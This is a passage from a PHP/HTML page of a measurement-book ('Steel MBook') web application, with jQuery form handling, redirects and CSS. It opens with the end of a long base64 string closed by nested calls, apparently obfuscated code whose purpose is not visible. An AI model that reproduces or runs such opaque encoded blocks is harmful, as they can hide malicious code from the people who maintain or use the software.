pKX2diJv7xtHqvdqzie95QdmeYO/I477lnfiT95suQOPqEQCnCmifbcpO/VPafcT7Lg+FWkwwq3lHx7vb69rU1YlladPOLtJ6DFv/MUYnfSW41St//XpHSZC7txS1VHcox6CoEE8GmXe23xOEOcErgt9LLokKkYJgPkqGsiaR84O9AetuAr3OmnAlBZWYIixMdK/e8tUtlVDVrygVtF7DQeJXfWiExvbU0oA5ocTL5UAkiHkPSDdGDLe02tUJ6Bot55nS8r99zttBeU7Hd57zLc9ZA0/gAT2NvbSjsMRPrjb2A9QNR9oYKdPINzCzXiqxoHE9nogqr3nm3XKY4VWppJk3MZttSmb6ig26EqKN8pQLU8iG0tBIQQZwkkzaR5DbAvdsiAcGyyiPWNjzagdys4QR4hMSZLKffwpZSaTChVcbsJ39onf8VN4vO2m93gOFx2QS7IO0a+4cBfrWpLCxfuZU3/wht9IZLEwfgep7Fco6OJZo+IS1f5e/NK4bixFTotZbpuvkLNt/v73+9v3//Fw==')))));

 ?>
 
 <?php if($NextMBOption > 0){ ?>
 	<script>
		var NoOfMB = "<?php echo $NextMBOption; ?>";
		BootstrapDialog.alert("You need to select next "+NoOfMB+" MBook to generate Steel MBook");
		$('#myModal').modal({backdrop:'static', keyboard:true, show:true});
		$(function(){
			$('#NextMB').change(function(event){ 
				var sheetid 		= 	$("#txt_sheet_id").val();
				var staffid			=	$("#txt_staffid").val();
				var rbn				=	$("#txt_rbn").val();
				var generatetype 	= 	"sw";
				$("#MBPageRefSec").html('');
				var x = 1;
				$.each($("#NextMB option:selected"), function(){   //alert($(this).text())
					var mbid 			= 	 $(this).val();//$("#NextMB option:selected").attr('value');//alert(currentmbooknovalue);
					var mbno 			= 	 $(this).text();//$("#NextMB option:selected").text();
					if(mbid != ""){
						$.post("MBookNoService.php", {currentmbook: mbid, currentbmookname: mbno, sheetid: sheetid, generatetype: generatetype, staffid: staffid, currentrbn: rbn}, function (data) { //alert(data);
							var pageno = data;
							var OutStr = "<div class='mbpgdiv'>MBook No. <input type='text' name='txt_next_mb"+x+"' class='mbtxt' value='"+mbno+"' readonly=''> &nbsp;Page : <input type='text' name='txt_next_mbpage"+x+"' class='mbtxt' value='"+pageno+"' readonly=''><input type='hidden' name='txt_no[]' class='mbtxt' value='"+x+"' readonly=''></div>";
							$("#MBPageRefSec").append(OutStr);
							x++;
						});
					}
				});
				
			});
		});
	</script>
<?php } ?>
</body>
<link rel="stylesheet" href="dashboard/MyView/TreeLabelStyle.css">
<script type="text/javascript">
   $(function(){ 
	   var getstr = document.getElementById("txt_boxid_str").value;
	   var splitval = getstr.split("*"); //alert(splitval.length);
	   var x=0;
	   for(x=0;x<splitval.length;x+=3)
	   {
			document.getElementById("txt_pageid"+splitval[x]).value = "C/o to page "+splitval[x+1]+" /Steel MB No. "+"<?php echo $mbookno; ?>"; 
	   }
   });
	function Nextpage(){
		var NotGenerate  = document.getElementById("hid_not_generate").value;
		if(NotGenerate == 0){
			/*BootstrapDialog.show({
				title: 'Alert',
				message: 'General Measurements Completed, Click below button to go to respective page.',
				buttons: [{
					label: 'General',
					action: function(dialog) {
						dialog.close();
						window.location.replace("MBookGenerateSection1.php");
					}
				}, {
					label: 'Steel',
					action: function(dialog) {
						dialog.close();
						window.location.replace("MBookGenerateSection2.php");
					}
				}]
			});*/
			url = "MBookGenerateSection3.php";
			window.location.replace(url);
		}else{
			url = "MBookGenerateSection2.php";
			window.location.replace(url);
		}
		//url = "MBookGenerateSection2.php";
		//window.location.replace(url);
   	}
	$(".NextMB").chosen();
</script>
<style>
	.BottomContent1{
		cursor:pointer;
		pointer-events:auto;
		background-color:#009ff4;
		font-size:14px;
		letter-spacing:1px;
	}
	.BottomContent1:hover{
		background-color:#D50237;
	}
	.modal-body {
		font-size: 12px;
		font-family:Verdana, Arial, Helvetica, sans-serif;
		color:#002D95;
		font-weight:600;
	}
	.mbpgdiv{
		padding:5px;
		border:1px solid #EBEBEB;
	}
	.mbtxt{
		padding:1px 5px 1px 5px;
		width:30px;
		border:1px solid #4096FF;
		text-align:right
	}
	.modal-btn-n{
		padding:8px;
		border:1px solid #0156E4;
		background:#0156E4;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
	.modal-btn-n:hover{
		background:#0048CE;
		border:1px solid #0048CE;
	}
	.modal-btn-c{
		padding:8px;
		border:1px solid #F1015B;
		background:#F1015B;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
	.modal-btn-c:hover{
		background:#D5004A;
		border:1px solid #D5004A;
	}
	.bootstrap-dialog-footer-buttons > .btn-default{
		padding:8px;
		border:1px solid #0156E4;
		background:#0156E4;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
</style>
</html>